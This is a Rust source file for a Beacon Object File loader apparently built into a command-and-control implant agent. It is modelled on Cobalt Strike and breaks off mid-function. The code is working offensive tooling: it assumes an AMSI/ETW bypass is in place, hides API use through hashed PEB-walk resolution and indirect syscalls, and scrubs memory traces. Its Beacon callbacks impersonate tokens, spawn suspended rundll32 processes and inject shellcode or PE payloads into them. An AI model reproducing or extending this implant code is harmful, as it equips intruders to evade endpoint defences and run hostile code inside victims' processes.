//! BOF (Beacon Object File) / COFF loader.
//!
//! Executes small position-independent C/Rust object files inside the agent
//! process — the equivalent of Cobalt Strike's BOF capability.  Compatible
//! with the entire public BOF ecosystem (trustedsec, CCob, naaf, etc.) because
//! it uses the standard `DLL$Function` symbol resolution scheme.
//!
//! # Architecture
//!
//! 1. **COFF parser** — parses the COFF header, sections, symbol table, and
//!    string table from raw `.o` / `.obj` bytes.
//! 2. **Loader** — allocates RW memory, maps sections, applies relocations,
//!    resolves external symbols, and sets per-section protections (RX for .text,
//!    RW for .data, RO for .rdata).  The entire BOF region is never RWX — only
//!    individual sections that request both execute+write get RWX.
//! 3. **Symbol resolver** — provides Beacon-compatible API functions
//!    (`BeaconPrintf`, `BeaconDataParse`, etc.) and resolves `DLL$Function`
//!    patterns dynamically via `LoadLibraryA` + `GetProcAddress`.
//! 4. **Executor** — finds the `go` entry point, creates a thread, captures
//!    output via thread-local buffer, and enforces a timeout.
//! 5. **Cleanup** — frees COFF memory, clears output buffer, applies memory
//!    hygiene.
//!
//! # Integration points
//!
//! - **AMSI/ETW bypass** — assumed already active (HWBP or memory patch).
//! - **Sleep obfuscation** — BOF execution thread is short-lived, but the
//!   allocated region is cleaned up immediately after execution.
//! - **Memory hygiene** — `scrub_peb_traces()` called after execution.
//! - **Indirect syscalls** — uses `NtAllocateVirtualMemory` / `NtFreeVirtualMemory`
//!   when available, falls back to `VirtualAlloc` / `VirtualFree`.
//!
//! # Feature gate
//!
//! The entire module is compiled only on `cfg(windows)`.

#![cfg(windows)]

use std::ffi::c_void;
use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};

// CloseHandle removed — using NtClose indirect syscall
// LoadLibraryA/GetProcAddress removed — using pe_resolve dynamic resolution
// VirtualAlloc/VirtualFree/VirtualProtect removed — using Nt* indirect syscalls
// CreateThread/WaitForSingleObject removed — using NtCreateThreadEx/NtWaitForSingleObject indirect syscalls
// CreateEventW removed — was unused
use crate::win_types::PAGE_READWRITE;
use windows_sys::Win32::System::Memory::PAGE_READONLY;
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ};
// ── Constants ────────────────────────────────────────────────────────────────

/// Maximum BOF size (1 MB).
const MAX_COF_SIZE: usize = 1024 * 1024;
/// Maximum number of arguments.
const MAX_ARGS: usize = 32;
/// Default execution timeout (seconds).
const DEFAULT_TIMEOUT_SECS: u64 = 60;
/// Minimal thread access for BOF execution: THREAD_QUERY_LIMITED_INFORMATION | THREAD_TERMINATE.
const THREAD_WAIT_ACCESS: u64 = 0x0042;
/// Machine type for AMD64 (x86-64).
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
/// Machine type for i386 (x86).
const IMAGE_FILE_MACHINE_I386: u16 = 0x014C;
/// COFF section characteristic: executable.
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
/// COFF section characteristic: readable.
const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
/// COFF section characteristic: writable.
const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;

// ── Relocation types ─────────────────────────────────────────────────────────

// AMD64
const IMAGE_REL_AMD64_ADDR64: u16 = 0x0001;
const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
const IMAGE_REL_AMD64_REL32: u16 = 0x0004;
const IMAGE_REL_AMD64_REL32_1: u16 = 0x0005;
const IMAGE_REL_AMD64_REL32_2: u16 = 0x0006;
const IMAGE_REL_AMD64_REL32_3: u16 = 0x0007;
const IMAGE_REL_AMD64_REL32_4: u16 = 0x0008;
const IMAGE_REL_AMD64_REL32_5: u16 = 0x0009;

// i386
const IMAGE_REL_I386_DIR32: u16 = 0x0006;
const IMAGE_REL_I386_REL32: u16 = 0x0014;

// ── COFF structures ──────────────────────────────────────────────────────────

/// COFF file header (IMAGE_FILE_HEADER).
#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct CoffHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

/// COFF section header (IMAGE_SECTION_HEADER).
#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct CoffSection {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_line_numbers: u32,
    number_of_relocations: u16,
    number_of_line_numbers: u16,
    characteristics: u32,
}

/// COFF symbol table entry (8 bytes name inline or offset, 24 bytes total).
#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct CoffSymbol {
    name: [u8; 8],
    value: u32,
    section_number: i16,
    type_: u16,
    storage_class: u8,
    number_of_aux_symbols: u8,
}

/// COFF relocation entry.
#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct CoffRelocation {
    virtual_address: u32,
    symbol_table_index: u32,
    r#type: u16,
}

// ── Thread-local output buffer ───────────────────────────────────────────────

/// Global output buffer for BOF callbacks.  Written to by `BeaconOutput` and
/// `BeaconPrintf`, read after BOF execution completes.
static OUTPUT_BUFFER: AtomicPtr<u8> = AtomicPtr::new(std::ptr::null_mut());
static OUTPUT_BUFFER_LEN: AtomicUsize = AtomicUsize::new(0);
static OUTPUT_BUFFER_CAP: AtomicUsize = AtomicUsize::new(0);

const INITIAL_OUTPUT_CAP: usize = 4096;

/// Allocate or reset the output buffer.
fn ensure_output_buffer() -> *mut u8 {
    let ptr = OUTPUT_BUFFER.load(Ordering::SeqCst);
    if ptr.is_null() {
        let layout = std::alloc::Layout::from_size_align(INITIAL_OUTPUT_CAP, 8).unwrap();
        let new_ptr = unsafe { std::alloc::alloc(layout) };
        OUTPUT_BUFFER.store(new_ptr, Ordering::SeqCst);
        OUTPUT_BUFFER_LEN.store(0, Ordering::SeqCst);
        OUTPUT_BUFFER_CAP.store(INITIAL_OUTPUT_CAP, Ordering::SeqCst);
        new_ptr
    } else {
        OUTPUT_BUFFER_LEN.store(0, Ordering::SeqCst);
        ptr
    }
}

/// Append bytes to the output buffer, growing if needed.
unsafe fn append_output(data: &[u8]) {
    let len = OUTPUT_BUFFER_LEN.load(Ordering::SeqCst);
    let cap = OUTPUT_BUFFER_CAP.load(Ordering::SeqCst);
    // P2-07: Overflow check for buffer size calculation.
    let needed = match len.checked_add(data.len()) {
        Some(v) => v,
        None => {
            tracing::warn!("[coff_loader] append_output overflow, dropping output chunk");
            return;
        }
    };

    if needed > cap {
        // HIGH-003: use checked arithmetic to prevent capacity overflow.
        let doubled = match needed.checked_mul(2) {
            Some(v) => v,
            None => {
                tracing::warn!(
                    "[coff_loader] append_output capacity overflow (needed={}), dropping output chunk",
                    needed
                );
                return;
            }
        };
        let new_cap = doubled.max(4096);
        let new_layout = std::alloc::Layout::from_size_align(new_cap, 8).unwrap();
        let old_ptr = OUTPUT_BUFFER.load(Ordering::SeqCst);
        let new_ptr = if old_ptr.is_null() {
            std::alloc::alloc(new_layout)
        } else {
            let old_layout = std::alloc::Layout::from_size_align(cap, 8).unwrap();
            let p = std::alloc::realloc(old_ptr, old_layout, new_cap);
            p
        };
        OUTPUT_BUFFER.store(new_ptr, Ordering::SeqCst);
        OUTPUT_BUFFER_CAP.store(new_cap, Ordering::SeqCst);
    }

    let ptr = OUTPUT_BUFFER.load(Ordering::SeqCst);
    let len = OUTPUT_BUFFER_LEN.load(Ordering::SeqCst);
    std::ptr::copy_nonoverlapping(data.as_ptr(), ptr.add(len), data.len());
    OUTPUT_BUFFER_LEN.store(len + data.len(), Ordering::SeqCst);
}

/// Take the output buffer contents as a Vec<u8>.
fn take_output() -> Vec<u8> {
    unsafe {
        let ptr = OUTPUT_BUFFER.load(Ordering::SeqCst);
        let len = OUTPUT_BUFFER_LEN.load(Ordering::SeqCst);
        if ptr.is_null() || len == 0 {
            return Vec::new();
        }
        let out = std::slice::from_raw_parts(ptr, len).to_vec();
        OUTPUT_BUFFER_LEN.store(0, Ordering::SeqCst);
        out
    }
}

/// Free the output buffer.
fn free_output_buffer() {
    unsafe {
        let ptr = OUTPUT_BUFFER.load(Ordering::SeqCst);
        let cap = OUTPUT_BUFFER_CAP.load(Ordering::SeqCst);
        if !ptr.is_null() && cap > 0 {
            let layout = std::alloc::Layout::from_size_align(cap, 8).unwrap();
            std::alloc::dealloc(ptr, layout);
            OUTPUT_BUFFER.store(std::ptr::null_mut(), Ordering::SeqCst);
            OUTPUT_BUFFER_LEN.store(0, Ordering::SeqCst);
            OUTPUT_BUFFER_CAP.store(0, Ordering::SeqCst);
        }
    }
}

// ── Beacon-compatible callback trampolines ───────────────────────────────────

/// Data parser state passed to BOFs.
#[repr(C)]
struct BeaconDataParser {
    original: *const u8,
    buffer: *const u8,
    length: i32,
}

/// Beacon data type for `BeaconDataParse`.
#[repr(C)]
struct BeaconData {
    original: *const u8,
    buffer: *const u8,
    length: i32,
}

/// `BeaconDataParse(parser, buffer, size)` — initialize parser from packed args.
unsafe extern "C" fn beacon_data_parse(parser: *mut BeaconDataParser, buffer: *mut u8, size: i32) {
    if parser.is_null() {
        return;
    }
    (*parser).original = buffer;
    (*parser).buffer = buffer;
    (*parser).length = size;
}

/// `BeaconDataInt(parser)` — extract a 4-byte little-endian int.
unsafe extern "C" fn beacon_data_int(parser: *mut BeaconDataParser) -> i32 {
    if parser.is_null() || (*parser).length < 4 {
        return 0;
    }
    let buf = (*parser).buffer;
    let val = i32::from_le_bytes([*buf, *buf.add(1), *buf.add(2), *buf.add(3)]);
    (*parser).buffer = buf.add(4);
    (*parser).length -= 4;
    val
}

/// `BeaconDataShort(parser)` — extract a 2-byte little-endian short.
unsafe extern "C" fn beacon_data_short(parser: *mut BeaconDataParser) -> i16 {
    if parser.is_null() || (*parser).length < 2 {
        return 0;
    }
    let buf = (*parser).buffer;
    let val = i16::from_le_bytes([*buf, *buf.add(1)]);
    (*parser).buffer = buf.add(2);
    (*parser).length -= 2;
    val
}

/// `BeaconDataLength(parser)` — return remaining bytes.
unsafe extern "C" fn beacon_data_length(parser: *mut BeaconDataParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    (*parser).length
}

/// `BeaconDataExtract(parser, size)` — extract a length-prefixed blob.
unsafe extern "C" fn beacon_data_extract(parser: *mut BeaconDataParser, size: *mut i32) -> *mut u8 {
    if parser.is_null() || (*parser).length < 4 {
        if !size.is_null() {
            *size = 0;
        }
        return std::ptr::null_mut();
    }
    let len = beacon_data_int(parser);
    if len <= 0 || (*parser).length < len {
        if !size.is_null() {
            *size = 0;
        }
        return std::ptr::null_mut();
    }
    let ptr = (*parser).buffer as *mut u8;
    (*parser).buffer = (*parser).buffer.add(len as usize);
    (*parser).length -= len;
    if !size.is_null() {
        *size = len;
    }
    ptr
}

/// Expand a printf-style format string using a flat array of 64-bit variadic arguments.
///
/// Supports: `%d` (i32), `%i` (i32), `%s` (C string ptr), `%x` (u32 hex),
/// `%p` (pointer), `%ld` (i64), `%lx` (u64 hex), `%%` (literal percent).
///
/// On Windows x64, the caller's variadic args arrive in r8, r9, and on the
/// stack at [rsp+0x28], [rsp+0x30], ….  The public wrappers pass these as
/// explicit `u64` parameters which the x64 ABI places in those exact
/// registers / stack slots.
unsafe fn expand_format(fmt: *const i8, args: &[u64]) -> Vec<u8> {
    if fmt.is_null() {
        return Vec::new();
    }
    let fmt_str = std::ffi::CStr::from_ptr(fmt);
    let fmt_bytes = fmt_str.to_bytes();
    let mut output = Vec::with_capacity(fmt_bytes.len().saturating_mul(2));
    let mut arg_idx = 0usize;
    let mut i = 0;
    while i < fmt_bytes.len() {
        if fmt_bytes[i] == b'%' && i + 1 < fmt_bytes.len() {
            let spec = fmt_bytes[i + 1];
            match spec {
                b'd' | b'i' => {
                    if arg_idx < args.len() {
                        let val = args[arg_idx] as i32;
                        let mut buf = [0u8; 12]; // -2147483648 = 11 chars + NUL
                        let written = fmt_i32(&mut buf, val);
                        output.extend_from_slice(&buf[..written]);
                        arg_idx += 1;
                    }
                    i += 2;
                }
                b's' => {
                    if arg_idx < args.len() {
                        let ptr = args[arg_idx] as *const i8;
                        if !ptr.is_null() {
                            if let Ok(s) = std::ffi::CStr::from_ptr(ptr).to_str() {
                                output.extend_from_slice(s.as_bytes());
                            }
                        }
                        arg_idx += 1;
                    }
                    i += 2;
                }
                b'x' => {
                    if arg_idx < args.len() {
                        let val = args[arg_idx] as u32;
                        let mut buf = [0u8; 8];
                        let written = format_u32_hex(&mut buf, val);
                        output.extend_from_slice(&buf[..written]);
                        arg_idx += 1;
                    }
                    i += 2;
                }
                b'p' => {
                    if arg_idx < args.len() {
                        let val = args[arg_idx];
                        // "0x" prefix + 16 hex chars
                        output.extend_from_slice(b"0x");
                        let mut buf = [0u8; 16];
                        format_u64_hex_padded(&mut buf, val);
                        output.extend_from_slice(&buf);
                        arg_idx += 1;
                    }
                    i += 2;
                }
                b'%' => {
                    output.push(b'%');
                    i += 2;
                }
                b'l' => {
                    // %ld or %lx
                    if i + 2 < fmt_bytes.len() {
                        let next = fmt_bytes[i + 2];
                        match next {
                            b'd' => {
                                if arg_idx < args.len() {
                                    let val = args[arg_idx] as i64;
                                    let mut buf = [0u8; 21]; // -9223372036854775808
                                    let written = fmt_i64(&mut buf, val);
                                    output.extend_from_slice(&buf[..written]);
                                    arg_idx += 1;
                                }
                                i += 3;
                            }
                            b'x' => {
                                if arg_idx < args.len() {
                                    let val = args[arg_idx] as u64;
                                    let mut buf = [0u8; 16];
                                    format_u64_hex_padded(&mut buf, val);
                                    output.extend_from_slice(&buf);
                                    arg_idx += 1;
                                }
                                i += 3;
                            }
                            _ => {
                                output.push(b'%');
                                output.push(spec);
                                i += 2;
                            }
                        }
                    } else {
                        output.push(b'%');
                        output.push(spec);
                        i += 2;
                    }
                }
                _ => {
                    output.push(b'%');
                    output.push(spec);
                    i += 2;
                }
            }
        } else {
            output.push(fmt_bytes[i]);
            i += 1;
        }
    }
    output
}

/// Write lower-case hex for `val` into `buf` (no padding, no prefix).
/// Returns the number of bytes written.
fn format_u32_hex(buf: &mut [u8; 8], mut val: u32) -> usize {
    if val == 0 {
        buf[0] = b'0';
        return 1;
    }
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut tmp = [0u8; 8];
    let mut pos = 0;
    while val > 0 {
        tmp[pos] = HEX[(val & 0xF) as usize];
        val >>= 4;
        pos += 1;
    }
    // Reverse into buf
    for j in 0..pos {
        buf[j] = tmp[pos - 1 - j];
    }
    pos
}

/// Write 16-char zero-padded lower-case hex for `val` into `buf`.
fn format_u64_hex_padded(buf: &mut [u8; 16], val: u64) {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    for i in 0..16 {
        buf[15 - i] = HEX[((val >> (i * 4)) & 0xF) as usize];
    }
}

/// Write signed decimal for `val` into `buf`. Returns byte count written.
fn fmt_i32(buf: &mut [u8; 12], mut val: i32) -> usize {
    if val == 0 {
        buf[0] = b'0';
        return 1;
    }
    let neg = val < 0;
    let mut pos = 0;
    let mut digits = [0u8; 11];
    if neg {
        val = val.wrapping_neg(); // handles i32::MIN correctly
    }
    while val > 0 {
        digits[pos] = b'0' + (val % 10) as u8;
        val /= 10;
        pos += 1;
    }
    let mut out = 0;
    if neg {
        buf[out] = b'-';
        out += 1;
    }
    for j in (0..pos).rev() {
        buf[out] = digits[j];
        out += 1;
    }
    out
}

/// Write signed decimal for `val` into `buf`. Returns byte count written.
fn fmt_i64(buf: &mut [u8; 21], mut val: i64) -> usize {
    if val == 0 {
        buf[0] = b'0';
        return 1;
    }
    let neg = val < 0;
    let mut pos = 0;
    let mut digits = [0u8; 20];
    if neg {
        val = val.wrapping_neg(); // handles i64::MIN correctly
    }
    while val > 0 {
        digits[pos] = b'0' + (val % 10) as u8;
        val /= 10;
        pos += 1;
    }
    let mut out = 0;
    if neg {
        buf[out] = b'-';
        out += 1;
    }
    for j in (0..pos).rev() {
        buf[out] = digits[j];
        out += 1;
    }
    out
}

/// Maximum number of variadic args we capture from the x64 calling convention.
///
/// `BeaconPrintf(typ, fmt, ...)` — `typ` is rcx, `fmt` is rdx, so variadic
/// args start at the 3rd position: r8, r9, then stack slots [rsp+0x28],
/// [rsp+0x30], [rsp+0x38], [rsp+0x40].  We accept 8 explicit `u64` params
/// after `fmt` to cover typical BOF usage; the ABI guarantees they arrive
/// in the correct registers / stack slots.
const MAX_VA_ARGS: usize = 8;

/// `BeaconPrintf(type, fmt, ...)` — formatted output to the callback buffer.
///
/// Expands `%d`, `%i`, `%s`, `%x`, `%p`, `%ld`, `%lx`, `%%` specifiers
/// using variadic arguments extracted from the Windows x64 calling convention.
///
/// The ABI passes the first 4 integer/pointer args in rcx, rdx, r8, r9 and
/// additional args on the stack at [rsp+0x28], [rsp+0x30], etc.  By declaring
/// explicit `u64` parameters beyond `fmt`, the compiler places them in r8, r9,
/// and the correct stack slots — giving us a va_list equivalent without
/// `unsafe` variadic intrinsics.
unsafe extern "system" fn beacon_printf(
    typ: i32,
    fmt: *const i8,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
    a9: u64,
    a10: u64,
) -> i32 {
    let args: [u64; MAX_VA_ARGS] = [a3, a4, a5, a6, a7, a8, a9, a10];
    let output = expand_format(fmt, &args);
    append_output(&output);
    append_output(b"\n");
    typ
}

/// `BeaconOutputPrintf(type, fmt, ...)` — formatted output, identical to BeaconPrintf.
unsafe extern "system" fn beacon_output_printf(
    typ: i32,
    fmt: *const i8,
    a3: u64,
    a4: u64,
    a5: u64,
    a6: u64,
    a7: u64,
    a8: u64,
    a9: u64,
    a10: u64,
) -> i32 {
    let args: [u64; MAX_VA_ARGS] = [a3, a4, a5, a6, a7, a8, a9, a10];
    let output = expand_format(fmt, &args);
    append_output(&output);
    append_output(b"\n");
    typ
}

/// `BeaconOutput(type, data, len)` — raw output callback.
unsafe extern "C" fn beacon_output(_typ: i32, data: *mut u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    let slice = std::slice::from_raw_parts(data, len as usize);
    append_output(slice);
}

/// `BeaconUseToken(token_handle)` — impersonate the given token.
///
/// Resolves `ImpersonateLoggedOnUser` from advapi32 via PEB-walk (no IAT)
/// and applies the supplied token handle to the current thread.
unsafe extern "C" fn beacon_use_token(token_handle: *mut c_void) -> i32 {
    if token_handle.is_null() {
        tracing::warn!("[coff_loader] BeaconUseToken: null token handle");
        return -1;
    }
    // Resolve ImpersonateLoggedOnUser from advapi32 via PEB-walk.
    let advapi32 =
        match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0")) {
            Some(h) => h,
            None => {
                tracing::warn!("[coff_loader] BeaconUseToken: failed to resolve advapi32.dll");
                return -1;
            }
        };
    let func_addr = match pe_resolve::get_proc_address_by_hash(
        advapi32,
        pe_resolve::hash_str(b"ImpersonateLoggedOnUser\0"),
    ) {
        Some(a) => a,
        None => {
            tracing::warn!(
                "[coff_loader] BeaconUseToken: failed to resolve ImpersonateLoggedOnUser"
            );
            return -1;
        }
    };
    type FnImpersonateLoggedOnUser = unsafe extern "system" fn(*mut c_void) -> i32;
    let impersonate: FnImpersonateLoggedOnUser = std::mem::transmute(func_addr);
    let ok = impersonate(token_handle);
    if ok == 0 {
        tracing::warn!("[coff_loader] BeaconUseToken: ImpersonateLoggedOnUser failed");
        return -1;
    }
    0
}

/// `BeaconRevertToken()` — delegate to rev2self.
unsafe extern "C" fn beacon_revert_token() -> i32 {
    match crate::token_manipulation::rev2self() {
        Ok(_) => 0,
        Err(e) => {
            tracing::warn!("[coff_loader] BeaconRevertToken failed: {e}");
            -1
        }
    }
}

/// `BeaconGetSpawnTo(x86, buffer, length)` — return a spawn-to path.
unsafe extern "C" fn beacon_get_spawn_to(_x86: i32, buffer: *mut u8, length: i32) {
    if buffer.is_null() || length <= 0 {
        return;
    }
    // Default spawn-to: rundll32.exe
    let spawn_to = b"rundll32.exe\0";
    let copy_len = std::cmp::min(spawn_to.len(), length as usize);
    std::ptr::copy_nonoverlapping(spawn_to.as_ptr(), buffer, copy_len);
}

/// Stored sacrificial process info for BeaconInjectTemporaryProcess.
/// Only one sacrificial process is active at a time per BOF invocation.
static SACRIFICIAL_PROCESS: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
static SACRIFICIAL_PID: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

/// `BeaconSpawnTemporaryProcess(x86, suppressed, handle)` — spawn sacrificial process.
///
/// Creates a suspended sacrificial process via `CreateProcessW` resolved from
/// kernel32 (PEB-walk, no IAT).  The process handle and PID are stored for
/// later use by `BeaconInjectTemporaryProcess`.
unsafe extern "C" fn beacon_spawn_temporary_process(
    x86: i32,
    _suppressed: i32,
    handle: *mut *mut c_void,
) -> i32 {
    if handle.is_null() {
        return -1;
    }
    *handle = std::ptr::null_mut();

    // Resolve CreateProcessW from kernel32 via PEB-walk.
    let k32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
        Some(h) => h,
        None => {
            tracing::warn!("[coff_loader] BeaconSpawnTemporaryProcess: kernel32 not found");
            return -1;
        }
    };
    let cpw_addr = match pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"CreateProcessW\0"),
    ) {
        Some(a) => a,
        None => {
            tracing::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW not found");
            return -1;
        }
    };
    type FnCreateProcessW = unsafe extern "system" fn(
        *const u16,  // lpApplicationName
        *mut u16,    // lpCommandLine (mutable per Win32)
        *mut c_void, // lpProcessAttributes
        *mut c_void, // lpThreadAttributes
        i32,         // bInheritHandles
        u32,         // dwCreationFlags
        *mut c_void, // lpEnvironment
        *const u16,  // lpCurrentDirectory
        *mut c_void, // lpStartupInfo
        *mut c_void, // lpProcessInformation
    ) -> i32;
    let create_process: FnCreateProcessW = std::mem::transmute(cpw_addr);

    // Choose spawn-to binary path as UTF-16LE with null terminator.
    // C:\Windows\SysWOW64\rundll32.exe (x86) or C:\Windows\System32\rundll32.exe (x64).
    const RUNDLL32_X64: &[u16] = &[
        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92,
        114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
    ]; // "C:\Windows\System32\rundll32.exe\0"
    const RUNDLL32_X86: &[u16] = &[
        67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 87, 79, 87, 54, 52, 92,
        114, 117, 110, 100, 108, 108, 51, 50, 46, 101, 120, 101, 0,
    ]; // "C:\Windows\SysWOW64\rundll32.exe\0"
    let exe: &[u16] = if x86 != 0 { RUNDLL32_X86 } else { RUNDLL32_X64 };

    // STARTUPINFOW = 104 bytes, PROCESS_INFORMATION = 24 bytes.
    // Both zero-initialised.
    let mut startup_info = [0u8; 104];
    let si_cb = std::mem::size_of::<crate::win_types::STARTUPINFOW>() as u32;
    startup_info[0..4].copy_from_slice(&si_cb.to_ne_bytes());
    let mut proc_info = [0u8; 24]; // hProcess(8) + hThread(8) + dwProcessId(4) + dwThreadId(4)

    const CREATE_SUSPENDED: u32 = 0x0000_0004;

    let ok = create_process(
        exe.as_ptr(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        std::ptr::null_mut(),
        std::ptr::null(),
        startup_info.as_mut_ptr() as *mut c_void,
        proc_info.as_mut_ptr() as *mut c_void,
    );

    if ok == 0 {
        tracing::warn!("[coff_loader] BeaconSpawnTemporaryProcess: CreateProcessW failed");
        return -1;
    }

    // Extract handles from PROCESS_INFORMATION.
    let h_process =
        usize::from_ne_bytes(proc_info[0..8].try_into().unwrap_or([0u8; 8])) as *mut c_void;
    let _h_thread =
        usize::from_ne_bytes(proc_info[8..16].try_into().unwrap_or([0u8; 8])) as *mut c_void;
    let pid = u32::from_ne_bytes(proc_info[16..20].try_into().unwrap_or([0u8; 4]));

    // Close the thread handle — we only need the process handle.
    let _ = crate::syscall!("NtClose", _h_thread as u64);

    // Store for BeaconInjectTemporaryProcess.
    SACRIFICIAL_PROCESS.store(h_process as u64, Ordering::SeqCst);
    SACRIFICIAL_PID.store(pid, Ordering::SeqCst);

    *handle = h_process;
    0
}

/// `BeaconInjectProcess(hproc, pid, payload, pLen, pOffset)` — inject into process.
///
/// Extracts the payload slice `[pOffset..pLen)` and delegates to
/// `hollowing::inject_into_process(pid, payload)` which handles both PE
/// and raw shellcode payloads via indirect syscalls.
unsafe extern "C" fn beacon_inject_process(
    _hproc: *mut c_void,
    pid: i32,
    payload: *mut u8,
    p_len: i32,
    p_offset: i32,
) -> i32 {
    if payload.is_null() || p_len <= 0 {
        tracing::warn!("[coff_loader] BeaconInjectProcess: null payload or invalid length");
        return -1;
    }
    let offset = if p_offset < 0 { 0 } else { p_offset as usize };
    let len = p_len as usize;
    if offset >= len {
        tracing::warn!("[coff_loader] BeaconInjectProcess: offset >= length");
        return -1;
    }
    let data = std::slice::from_raw_parts(payload.add(offset), len - offset);
    match hollowing::inject_into_process(pid as u32, data) {
        Ok(_) => 0,
        Err(e) => {
            tracing::warn!("[coff_loader] BeaconInjectProcess failed: {e}");
            -1
        }
    }
}

/// `BeaconInjectTemporaryProcess(hproc, pid, payload, pLen, pOffset)` — inject into temp process.
///
/// Uses the sacrificial process created by a prior `BeaconSpawnTemporaryProcess`
/// call.  The `hproc` / `pid` parameters are typically the values returned by
/// that call, but we also fall back to the globally stored sacrificial process
/// if they are null / zero.
unsafe extern "C" fn beacon_inject_temporary_process(
    hproc: *mut c_void,
    pid: i32,
    payload: *mut u8,
    p_len: i32,
    p_offset: i32,
) -> i32 {
    if payload.is_null() || p_len <= 0 {
        tracing::warn!(
            "[coff_loader] BeaconInjectTemporaryProcess: null payload or invalid length"
        );
        return -1;
    }

    // Resolve target PID: prefer the explicit arg, fall back to stored sacrificial PID.
    let target_pid = if pid > 0 {
        pid as u32
    } else {
        let stored = SACRIFICIAL_PID.load(Ordering::SeqCst);
        if stored == 0 {
            tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess: no sacrificial process");
            return -1;
        }
        stored
    };

    // If hproc is null, use the stored sacrificial handle for NtClose in cleanup.
    let _ = hproc; // Suppress unused warning — the actual injection goes by PID.

    let offset = if p_offset < 0 { 0 } else { p_offset as usize };
    let len = p_len as usize;
    if offset >= len {
        tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess: offset >= length");
        return -1;
    }
    let data = std::slice::from_raw_parts(payload.add(offset), len - offset);
    match hollowing::inject_into_process(target_pid, data) {
        Ok(_) => 0,
        Err(e) => {
            tracing::warn!("[coff_loader] BeaconInjectTemporaryProcess failed: {e}");
            -1
        }
    }
}

/// `BeaconCleanupProcess(hproc)` — cleanup process handle.
///
/// Closes the process handle via `NtClose` (indirect syscall) and clears
/// the stored sacrificial process state.
unsafe extern "C" fn beacon_cleanup_process(hproc: *mut c_void) {
    if !hproc.is_null() {
        let _ = crate::syscall!("NtClose", hproc as u64);
    }
    // Clear stored sacrificial process state.
    let stored_handle = SACRIFICIAL_PROCESS.swap(0, Ordering::SeqCst);
    if stored_handle != 0 && stored_handle != hproc as u64 {
        // Also close the stored handle if it differs from the one the BOF passed.
        let _ = crate::syscall!("NtClose", stored_handle);
    }
    SACRIFICIAL_PID.store(0, Ordering::SeqCst);
}

/// `toNative(order, value)` — byte-swap if needed.  On x86/x64, native is LE.
unsafe extern "C" fn to_native(_order: i32, value: u32) -> u32 {
    // The agent runs on x86/x64 which is little-endian.  BOF data is also LE.
    // No conversion needed.
    value
}

// ── CRT wrapper trampolines ─────────────────────────────────────────────────

unsafe extern "C" fn crt_malloc(size: usize) -> *mut c_void {
    let layout = match std::alloc::Layout::from_size_align(size.max(1), 8) {
        Ok(l) => l,
        Err(_) => return std::ptr::null_mut(),
    };
    std::alloc::alloc(layout) as *mut c_void
}

unsafe extern "C" fn crt_free(ptr: *mut c_void) {
    if ptr.is_null() {
        return;
    }
    // Use runtime-resolved HeapFree to avoid IAT entry.
    let heap = get_process_heap();
    if let Some(heap_free) = resolve_heap_fn::<FnHeapFree>(b"HeapFree\0") {
        heap_free(heap, 0, ptr);
    }
}

unsafe extern "C" fn crt_calloc(count: usize, size: usize) -> *mut c_void {
    let total = match count.checked_mul(size) {
        Some(t) => t,
        None => return std::ptr::null_mut(),
    };
    let layout = match std::alloc::Layout::from_size_align(total.max(1), 8) {
        Ok(l) => l,
        Err(_) => return std::ptr::null_mut(),
    };
    let ptr = std::alloc::alloc_zeroed(layout);
    ptr as *mut c_void
}

unsafe extern "C" fn crt_realloc(ptr: *mut c_void, size: usize) -> *mut c_void {
    let new_layout = match std::alloc::Layout::from_size_align(size.max(1), 8) {
        Ok(l) => l,
        Err(_) => return std::ptr::null_mut(),
    };
    if ptr.is_null() {
        return std::alloc::alloc(new_layout) as *mut c_void;
    }
    // Without knowing the old size, use runtime-resolved HeapReAlloc.
    let heap = get_process_heap();
    if let Some(heap_realloc) = resolve_heap_fn::<FnHeapReAlloc>(b"HeapReAlloc\0") {
        heap_realloc(heap, 0, ptr, size) as *mut c_void
    } else {
        std::ptr::null_mut()
    }
}

unsafe extern "C" fn crt_memset(dst: *mut c_void, val: i32, count: usize) -> *mut c_void {
    std::ptr::write_bytes(dst as *mut u8, val as u8, count);
    dst
}

unsafe extern "C" fn crt_memcpy(dst: *mut c_void, src: *const c_void, count: usize) -> *mut c_void {
    std::ptr::copy_nonoverlapping(src as *const u8, dst as *mut u8, count);
    dst
}

unsafe extern "C" fn crt_strcpy(dst: *mut i8, src: *const i8) -> *mut i8 {
